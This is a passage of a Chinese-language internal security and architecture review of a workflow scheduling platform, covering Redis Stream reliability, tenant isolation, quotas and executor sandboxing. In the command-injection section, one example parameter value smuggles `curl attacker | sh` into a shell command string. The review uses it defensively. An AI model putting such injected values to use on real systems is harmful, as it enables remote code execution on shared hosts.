2. **实例快照瘦身**：`execution_plan` 仅存 **分层 nodeName 列表 + 依赖边 + 条件**；`WorkflowTask` 详情按 `taskId` 运行时查表或短 TTL 缓存，避免节点定义重复 N 次。
3. **运行时增量**：层推进只加载 **当前层 + 邻接信息**（或解析后缓存 `WorkflowExecutionPlan` 对象引用，避免每层 `readValue` 全量 JSON）。
4. **构建异步化**：超大工作流「提交定义 → 异步预计算 execution plan → 就绪后再允许启实例」；预览 API 可限流/超时。
5. **宽层保护**：单层并行度上限 + 分批入队（与 §1.4 分布式队列演进联动）。
6. **观测**：记录 `buildExecutionPlan` 耗时、plan JSON 字节数、拓扑 V/E；告警 P99 与 Redis 单 key 体积。

**参考**

- `docs/P4-2_TOPOLOGICAL_SORT_ENGINE_DESIGN.md` §Q4（大规模 DAG 优化方向，部分尚未落地）

### 5.4 Redis Stream 消费语义与运维缺口（P1）

**现状（代码事实）**

| 配置/行为 | 值 | 文件 |
|-----------|-----|------|
| 消费框架 | Spring `StreamMessageListenerContainer` | `TaskCompletionRedisStreamConfig` |
| `pollTimeout` | 1s | 同上 |
| `batchSize` | **1** | 同上 |
| 读偏移 | `ReadOffset.lastConsumed()` | 同上 |
| 成功处理 | `acknowledge(CONSUMER_GROUP, message)` | `TaskCompletionStreamListener` |
| 处理异常 | **不 ACK**，仅打日志 | 同上 |
| 流裁剪 | **无** `MAXLEN` / `XTRIM` | `TaskCompletionEventPublisher` |
| Pending 认领 | **无** `XCLAIM` / 定时重试任务 | — |
| 死信 | **无** 独立 DLQ Stream | — |

**问题**

1. **文档与实现不一致**  
   - `REDIS_STREAM_EVENT_DRIVEN_UPGRADE.md` 仍描述 `@PostConstruct` 手写 `readGroup` 循环、`@Async streamConsumerExecutor`；实际为 **容器自动拉取**，且无独立 `taskCompletionExecutor` 异步处理。  
   - 文档写「失败不确认 → 消费者组自动重试」：**Redis 不会自动把 PEL 消息推回给消费者**，需 **`XPENDING` + `XCLAIM`** 或应用侧定时认领，否则消息 **长期挂在 Pending**。

2. **至少一次投递，消费端非幂等**  
   - 若在 `incrementCompletedTasks` / `onWorkflowTaskTerminated` 之后、ACK 之前崩溃，重投可能导致 **完成计数重复**、重复进入 `proceedAfterLayerFinished`（下一层 `dispatchLayer` 靠 PENDING 过滤可部分缓解，但 **计数与日志不可信**）。  
   - 应对：按 `taskInstanceId`（或 Stream `recordId`）**幂等表/已处理集合**，或 Handler 内「已为终态则跳过副作用」。

3. **吞吐与积压**  
   - `batchSize=1` + 每条消息同步执行 DB + 可能全量解析 `execution_plan`（§5.3）→ 宽 DAG 一层大量终态时 **XLEN 陡增、消费 lag**。  
   - Stream **无长度上限**，Redis 内存持续增长；历史消息对业务无意义时仍占用空间。

4. **可观测性不足**  
   - 无应用指标：`stream_publish_fail_total`、`stream_consume_lag`、`pending_count`、`oldest_pending_idle_ms`。  
   - 运维只能靠 Redis CLI：`XLEN`、`XPENDING`、`XINFO CONSUMERS task-completion dag-engine-group`。

5. **多实例消费**  
   - 每实例随机 `dag-engine-{uuid}`，同组竞争消费 **符合预期**；但 **无均衡监控**，某实例慢会导致该 consumer PEL 堆积。  
   - Scheduler 重启后旧 consumer 名残留，`XINFO CONSUMERS` 中 idle consumer 需人工或定期清理（非功能错误，影响运维观感）。

**建议**

| 优先级 | 项 |
|--------|-----|
| P1 | 消费幂等（`workflow_task_instance` 已为同终态则跳过 `increment*` 与层推进） |
| P1 | 定时任务：`XPENDING` 超时 `XCLAIM` 重试 + 超过 N 次转入 DLQ Stream 或写 `stream_dead_letter` 表 |
| P1 | 发布失败 outbox 或同步 Facade 兜底（与 §5.1 合并实施） |
| P2 | `XADD` 使用近似 `MAXLEN ~`（如 1 万）或 cron `XTRIM` |
| P2 | 可配置 `batchSize`、消费线程池；监控对接 Prometheus |
| P2 | 修订 `REDIS_STREAM_EVENT_DRIVEN_UPGRADE.md` 与代码一致 |

**运维速查（积压/卡住）**

```bash
XLEN task-completion
XPENDING task-completion dag-engine-group
XINFO CONSUMERS task-completion dag-engine-group
```

- **XLEN 高、lag 大**：加 scheduler 实例或提高 batch、优化 Handler（§5.3）。  
- **XPENDING 持续增长**：查 ERROR 日志 → 修 bug 后 `XCLAIM`；勿误以为会自动重试。  
- **XLEN 正常但工作流卡住**：优先查 §5.1（回调/发布/ `workflowInstanceId`），而非 Stream 积压。

**涉及文件**

- `TaskCompletionRedisStreamConfig`、`TaskCompletionStreamListener`
- `TaskCompletionEventPublisher`、`TaskCompletionStreamHandler`
- `TaskCompletionStreamConstants`（`STREAM_KEY` / `CONSUMER_GROUP`）

### 5.5 环检测与拓扑排序重复、校验缺口（P2）

**现状**

- 创建/更新工作流：`WorkflowServiceImpl.validateDAG` → **DFS 三色法**检环。  
- 构建执行计划：`WorkflowExecutionServiceImpl.topologicalSort` → **Kahn** 再次检环（`visited.size() != graph.size()`）。

**问题**

- 同一 DAG **两次 O(V+E)**，大图重复计算（§5.3）。  
- `validateDAG` 无节点数/边数/JSON 体积上限；恶意或误配置超大 JSON 可拖垮 API。  
- 邻接表构建未对 **重复边** 去重，入度可能被重复累加（依赖 JSON 是否允许重复 `from→to`）。

**建议**

- 执行计划构建信任校验结果，或仅保留 Kahn 一处检环；校验阶段缓存拓扑分层结果供实例化复用。  
- 配置化上限 + 重复边规范化。

## 九、多租户隔离

> 设计参考：[MULTI_TENANCY_ROLLOUT_DESIGN.md](./MULTI_TENANCY_ROLLOUT_DESIGN.md)（策略 B：注册不自动建租户；`switch-tenant` 后业务 API 带租户 JWT）。

### 9.1 数据隔离（已实现：应用层为主）

**模型**

- `User` ↔ `Tenant`：**N:N**，经 `tenant_member(tenant_id, user_id, role)`（`OWNER/ADMIN/MEMBER/GUEST`）。
- 业务资源归属：`Project.tenant_id` → `Task.project_id` → `Workflow.project_id`；运行时 **`task_instance.tenant_id`**、`workflow_instance.tenant_id` 冗余落库。

**请求链路**

```
登录 JWT（仅 userId）
  → POST /api/auth/switch-tenant
  → 租户 JWT（claims: tenantId / tenantCode / tenantRole）
  → TenantAccessGuard.requireTenantMember（查 tenant_member）
  → 业务 Service 带 tenantId 条件查询（Project / Task / Workflow 等）
```

| 模块 | 隔离方式 |
|------|----------|
| **项目 / 任务 CRUD** | `ProjectServiceImpl` / `TaskServiceImpl`：`.eq(Project::getTenantId, tenantId)` |
| **工作流定义** | `@RequireWorkflowPermission` + `WorkflowSecurityAspect`；`validateProjectBelongsToTenant` |
| **工作流实例** | 创建时写 `tenant_id`；读时 `requireInstanceAccessible` → 经 `workflowService.getById` 校验 **工作流所属项目在当前租户** |
| **任务提交** | 普通提交：从 `JwtUserPrincipal.tenantId()` 写入 `TaskSubmitRequest`；工作流提交：要求请求体 **显式带 tenantId** |
| **配额 API** | `ResourceQuotaServiceImpl`：JWT 中 `tenantId` 必须与路径 `tenantId` 一致 |

**未采用**

- MyBatis 全局 **TenantLineHandler** / 行级自动 `tenant_id` 注入：依赖各 Service **手写条件**，新增 API 易漏。

### 9.2 调度隔离（部分：配额按租户，队列全局）

**现状**

| 项 | 行为 |
|----|------|
| **待调度扫描** | `TaskInstanceMapper.selectPendingTasks*`：**全库** `status=PENDING`，**不按 tenant_id 过滤** |
| **排序** | 全局 **priority + aging**（FIFO / Priority / ResourceAware 均如此） |
| **配额门控** | 调度单任务前 `evaluateReserveFeasibility(tenantId, …)`；`tenantId==null` → **跳过该任务** |
| **租户公平调度** | 设计稿 **WRR 分桶 + 每租户保底份额**：**未实现** |

**含义**

- **逻辑隔离**：A 租户任务不会写到 B 租户表（提交路径正确时）。
- **调度公平性**：大租户高优先级任务可与中小租户 **同队列竞争**；仅当某租户 **配额用尽** 时其任务被 skip，**不是**租户间轮转公平。
- **多 Scheduler 实例**：Leader 锁全局唯一，扫库仍是 **跨租户一批**。

**缺口（P1 / P2）**

1. **P1**：实现设计稿 §7 **租户级 WRR** 或「每轮每租户最多调度 K 个」。
2. **P2**：`selectPending` 可选按 `tenant_id` 分片（多租户超大流量时降低单查询竞争）。
3. **P2**：调度指标按 `tenant_id` 分桶（pending 深度、skip 原因、配额拒绝率）。

### 9.3 资源隔离（配额硬限制 + 节点池共享）

**三层资源模型**

| 层 | 表/对象 | 租户维度 | 作用 |
|----|---------|----------|------|
| **配额** | `resource_quota` | **每租户一行** | `max_cpu/memory/gpu`、`max_running_tasks`；`used_*` 条件增减 |
| **流水** | `resource_usage` | **带 tenant_id** | 预留/释放与 `task_instance_id` 绑定 |
| **节点** | `resource_node` + `resource_slot` | **无 tenant_id** | **全集群共享 Worker 池**；多租户竞争同一节点槽位 |

**调度时**

1. `checkQuota(tenantId)`（ResourceAware / Fifo 等路径）。
2. `resourceSlotService.reserve(tenantId, taskInstanceId, …)` → 选节点扣 **slot** + `tryConsumeForReserve(tenantId, …)`。
3. 节点层 **Best Fit**：在 ONLINE 节点中选能 `canFit` 的，**不区分节点归属租户**。

**结论**

- **强隔离**：租户 **配额上限**（CPU/内存/GPU/并发任务数），超配额无法 reserve。
- **弱隔离 / 共享**：物理节点与槽位 **不独占**；租户 A 任务可跑在租户 B 也使用的 Worker 上（平台型多租户常见做法）。
- **专用节点**：当前模型 **不支持**「某租户绑定某批 node」；需扩展 `resource_node.tenant_id` 或 label 调度。

**与 §3.5 交叉问题（P1）**

- `ResourceSlotServiceImpl.reserve` 首行 `tenantAccessGuard.requireTenantMember`。
- **调度循环无用户 JWT** 时，ResourceAware 路径调用 `reserve` 可能 **401/403**，表现为某租户任务永远 PENDING（若未走其它预留路径）。
- 建议：**系统级 reserve**（校验 `task_instance.tenant_id` + 内部凭证），与用户 API 的 `reserve` 分离。

### 9.4 数据隔离缺口与越权风险（P1 / P2）

| 风险 | 说明 |
|------|------|
| **按 ID 查询漏 tenant** | 无全局 ORM 拦截器；新增 `selectById` 若未 join `project.tenant_id` 可能 IDOR |
| **工作流实例 tenant_id** | 读路径主要校验 **workflow.project**，较少直接 `workflow_instance.tenant_id == principal.tenantId` |
| **Internal / Worker API** | `X-Internal-Token` / `X-Worker-Token` **不携带租户**；靠 taskInstanceId 与网络隔离，需防 token 泄露后跨租户改状态 |
| **工作流引擎提交** | 必须带 `tenantId`；伪造 tenantId 若未与 workflow 归属交叉校验，存在隐患（应校验 instance/workflow 同属租户） |

**建议**

1. 关键表只读/写清单 + Code Review 检查 **tenant 条件**。
2. `WorkflowLayerDispatchFacade` 提交任务时 **强制** `workflow_instance.tenant_id` 注入，禁止仅信任外部 request。
3. Internal 回调：按 `task_instance.tenant_id` 写审计日志；可选校验回调源与实例归属。
4. 可选：MyBatis-Plus 租户插件对 `task_instance`、`workflow_instance`、`project` 等表白名单启用。

**涉及文件**

- `TenantAccessGuard`、`JwtUserPrincipal`、`AuthController`（`switch-tenant`）
- `TaskSubmitServiceImpl`、`ProjectServiceImpl`、`TaskServiceImpl`
- `WorkflowSecurityAspect`、`WorkflowServiceImpl`
- `TaskInstanceMapper`（pending 查询）、`ResourceQuotaServiceImpl`、`ResourceSlotServiceImpl`
- `ResourceAwareSchedulerServiceImpl`（`checkQuota` / `reserveResource`）

### 9.5 租户配额（`resource_quota`）实现细节与防打满能力边界（P1 / P2）

**表结构与计数器**

| 字段 | 含义 |
|------|------|
| `max_cpu` / `max_memory_mb` / `max_gpu` | 租户可同时 **预留** 的资源上限 |
| `max_running_tasks` | 租户并发 **RUNNING（已 reserve）** 任务数上限 |
| `max_pending_tasks` | 设计为排队上限 |
| `used_cpu` / `used_memory_mb` / `used_gpu` / `running_tasks` | 当前占用（随 reserve/release 增减） |

**默认上限**（`loadOrCreateQuota` 首次插入）：CPU **10**、内存 **10240 MB**、GPU **0**、`max_running_tasks` **50**、`max_pending_tasks` **500**。

**两阶段门控**

1. **调度前软检查**：`evaluateReserveFeasibility`（读当前行，内存比较）→ 配额不足则 **skip 本轮**，任务仍 PENDING。  
2. **预留硬扣减**：`ResourceSlotServiceImpl.reserve` 内 **`tryConsumeForReserve`** → 单条 SQL **条件 UPDATE**，并发下 `rows!=1` 即失败，避免超分：

```sql
WHERE tenant_id = ? 
  AND used_cpu + ? <= max_cpu
  AND used_memory_mb + ? <= max_memory_mb
  AND used_gpu + ? <= max_gpu
  AND running_tasks + ? <= max_running_tasks
```

**释放**：任务终态 → `TaskInstanceTerminalHandler` → `releaseForTaskInstanceSystem` → `releaseUsed` 对称回退配额 + 节点 slot。

**如何限制「一个租户」占用**

- 该租户累计 `used_*` / `running_tasks` **不得超过** 其 `max_*` → 无法再 `reserve`，调度循环持续 skip。  
- **OWNER** 可通过 `PUT /api/resource/quota/{tenantId}` 调低上限（不得低于当前 `used_*`）。

**能否防止「一个租户把集群打满」？—— 部分能**

| 能防住 | 防不住 / 未实现 |
|--------|------------------|
| 单租户占用超过 **本租户配额** 的 CPU/内存/GPU/并发数 | 各租户 `max_*` **之和** 可大于集群物理总量（无全局 cap） |
| 与 **节点 slot** 联动：配额够但节点无槽位仍失败 | **`max_pending_tasks` 未在提交/调度路径校验**（仅落库与 API 展示） |
| 多租户竞争时，配额用尽者让出 **物理 slot** | 高优先级 + 大配额租户仍可长期占满 **共享节点**；无 WRR（§9.2） |
| 原子 consume 防并发超分 | 调度先 `evaluate` 再 `reserve` 存在 **TOCTOU**；最终以 `tryConsume` 为准 |

**建议**

1. **P1**：`TaskSubmitService` / 工作流提交前校验 `COUNT(PENDING)+1 <= max_pending_tasks`。  
2. **P2**：平台级 **cluster_quota** 或启动时校验 `SUM(tenant.max_cpu) <= cluster_cpu`。  
3. **P2**：调度指标：`quota_reject_total{tenant,reason}`。

**涉及文件**：`ResourceQuotaServiceImpl`、`ResourceQuotaMapper`、`ResourceSlotServiceImpl`、各 `*SchedulerServiceImpl.checkQuota`。

## 十、Shell/Python 执行器安全

> 执行器在 **Worker 进程**（`remote`）或 **Scheduler 进程**（`in-process`，默认）内以 **操作系统子进程** 运行用户配置，**不是** 沙箱化执行环境。

### 10.1 实现方式（与攻击面）

| 类型 | 启动方式 | 代码位置 |
|------|----------|----------|
| **SHELL** | `sh -c <command>` / `cmd.exe /c <command>` | `ShellTaskTypeExecutor`（scheduler + worker） |
| **PYTHON** | `ProcessBuilder([python, script, ...args])`（**非** shell 拼一条字符串） | `PythonTaskTypeExecutor` |
| **DOCKER** | `docker run -v <workDir>:/work ...` | `DockerTaskTypeExecutor`（隔离强于裸进程，仍依赖 Docker 安全） |

公共运行时：`ProcessExecutionHelper` — 设置 `workDirectory`、超时 `destroyForcibly`、stdout/stderr 截断（`outputMaxChars`），**无** cgroup/seccomp/降权用户/网络隔离。

### 10.2 命令注入（P0）

**SHELL — 高风险**

- 整条 `command` 交给 shell 解析（`sh -c`），经典 **命令注入** 面。
- `RunSpecBuilder` / 执行前对 `command`（及配置中的 `script`）做 **`${param}` 模板替换**（`ParameterTemplateResolver`），参数值 **未转义** 即拼入命令字符串。  
  例：`command: "python train.py --id=${id}"`，若 `id=1; curl attacker | sh` → shell 执行多条命令。
- **提交时可覆盖** `executorConfig`：`TaskSubmitServiceImpl` 在拷贝 Task 定义后，若请求体带了 `executorConfig` 则 **以请求为准** → 有提交权限的用户可在单次运行中改写命令。

**PYTHON — 中风险（弱于 SHELL，仍有坑）**

- 主命令用 `ProcessBuilder` 列表，**参数中的 `args` 为独立 argv**，不经过 `/bin/sh`，一般 **不会因分号被 shell 解析**。
- 风险点：
  - `executorConfig.python` 可指定 **任意可执行文件路径**（等价于运行任意程序）。
  - `script` 多为 **脚本路径**；若指向攻击者可控文件 → **任意代码执行**（调度系统本意，但对平台是 RCE）。
  - 若误把多行代码放进 `script` 字段而未使用 `python -c`，行为是「把字符串当文件名」而非执行，但 **不应依赖此误用** 作防护。
  - `args` 中若配置 `-c` 与恶意代码，仍可执行（配置问题）。

**DOCKER**

- `command` / `env` 同样走 `${param}` 替换；挂载 **宿主机 workDir** 到容器，容器内进程通常仍能 **读写信道挂载目录**；若挂载 Docker socket 或 `--privileged`（当前实现未显式加，但 image 由任务定义）风险更高。

### 10.3 沙箱（P0 — 基本未实现）

| 能力 | 现状 |
|------|------|
| 独立用户 / chroot | ❌ 以 Worker/Scheduler **服务账户** 运行 |
| 容器强制 | ❌ DOCKER 为可选类型，SHELL/PYTHON 为裸进程 |
| 文件系统白名单 | ❌ 仅 per-task 工作目录 `workDir/{taskInstanceId}` |
| 网络隔离 | ❌ 子进程继承主机网络 |
| 资源上限 | 部分：任务 `timeoutSeconds` + 租户 **resource_quota** + 节点 slot；**非** cgroup 级 CPU/内存硬隔离 |
| Seccomp/AppArmor | ❌ |

**结论**：本项目是 **「受信租户在受信 Worker 上跑脚本」** 模型，**不是** 多租户不可信代码的 **安全沙箱**（类似裸跑 Airflow ShellOperator）。

### 10.4 权限控制（P1）

| 层级 | 现状 |
|------|------|
| **谁可定义命令** | 租户内 `OWNER/ADMIN/MEMBER` 可 **创建/更新 Task**（含 `taskType`、`executorConfig`） |
| **谁可改单次运行配置** | 有 **submit** 权限且传 `executorConfig` 即可覆盖快照 |
| **Worker 接口** | `POST /worker/.../run` 依赖可选 **`X-Worker-Token`**；`worker.api.token` **未配置时 Filter 直接放行**（开发默认 `dev-worker-token` 需生产轮换） |
| **租户隔离** | 租户 A 的任务跑在 **共享 Worker 池** 上，与租户 B **同 OS 用户**；隔离靠配额与业务权限，**非** 内核级 |
| **in-process 模式** | 默认 `task.executor.mode=in-process` 时脚本在 **Scheduler 主机** 执行，泄露面 **大于** remote Worker |

### 10.5 建议（生产基线）

1. **P0**：产品定位写清 — **仅受信用户/受信租户**；禁止把平台当「公有云任意代码执行」。  
2. **P0**：SHELL 任务 — 禁止 `${}` 拼进 shell 字符串，或改为 **仅允许脚本路径 + argv 数组**、禁用 `sh -c`；对参数做 **严格 allowlist**（字母数字）。  
3. **P1**：高危 `taskType`（SHELL/PYTHON/DOCKER）仅 **OWNER/ADMIN**；MEMBER 只跑审批后的 Task 模板。  
4. **P1**：提交时 **禁止覆盖** `executorConfig`（或仅允许改 `parameters`）。  
5. **P1**：Worker **强制** `X-Worker-Token` + 网络隔离；生产禁用 in-process。  
6. **P2**：默认 DOCKER + 非 root、只读根 FS、无 Docker socket；或 K8s Job + 受限 SA。  
7. **P2**：专用低权 OS 用户、cgroup 限制 CPU/内存、独立网络 namespace。

- `ShellTaskTypeExecutor`、`PythonTaskTypeExecutor`、`ProcessExecutionHelper`（scheduler + worker）
- `ParameterTemplateResolver`、`RunSpecBuilder`、`TaskSubmitServiceImpl`
- `WorkerTokenFilter`、`TaskExecutorProperties`（`in-process` / `remote`）
- `WorkerRunController`、`WorkerRunService`
